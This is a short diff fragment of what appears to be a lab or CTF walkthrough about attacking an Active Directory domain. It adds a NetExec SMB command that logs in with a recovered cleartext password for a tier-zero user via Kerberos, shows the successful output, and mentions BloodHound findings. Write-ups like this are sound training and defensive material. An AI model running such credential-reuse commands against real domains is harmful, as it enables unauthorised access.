@@ -277,5 +277,14 @@ tyler:5rtfgvb%RTFGVB
 Looks like ive found some credentials!
 
 ```python
-
+nxc smb EC2AMAZ-A5O4OL8.past.local -u 'tyler' -p '5rtfgvb%RTFGVB' -k
+SMB         EC2AMAZ-A5O4OL8.past.local 445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         EC2AMAZ-A5O4OL8.past.local 445    EC2AMAZ-A5O4OL8  [+] past.local\tyler:5rtfgvb%RTFGVB
 ```
+
+After checking the user `tyler` in bloodhound i see he is in protected users so ive had to use kerberos auth!
+
+The user `tyler` is also a tier zero account
+
+# `tyler` domain permissions
+
